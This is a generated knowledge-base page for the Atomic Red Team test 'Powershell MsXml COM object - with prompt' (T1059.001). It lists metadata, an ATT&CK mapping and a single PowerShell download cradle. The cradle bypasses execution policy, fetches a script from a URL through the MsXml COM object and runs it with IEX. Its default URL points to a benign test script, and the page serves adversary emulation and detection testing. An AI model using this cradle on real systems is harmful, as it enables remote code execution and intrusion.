---
atomic_guid: "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da"
title: "Powershell MsXml COM object - with prompt"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.001"
attack_technique_name: "Command and Scripting Interpreter: PowerShell"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "command_prompt"
aliases:
  - "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da"
  - "Powershell MsXml COM object - with prompt"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Powershell MsXml COM object - with prompt

Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, "Download Cradle test success!" will be displayed.

Provided by https://github.com/mgreen27/mgreen27.github.io

## Metadata

- Atomic GUID: 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da
- Technique: T1059.001: Command and Scripting Interpreter: PowerShell
- Platforms: windows
- Executor: command_prompt
- Source Path: atomics/T1059.001/T1059.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.001]]

## Input Arguments

### url

- description: url of payload to execute
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1

## Executor

- name: command_prompt

### Command

```commandprompt
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml)
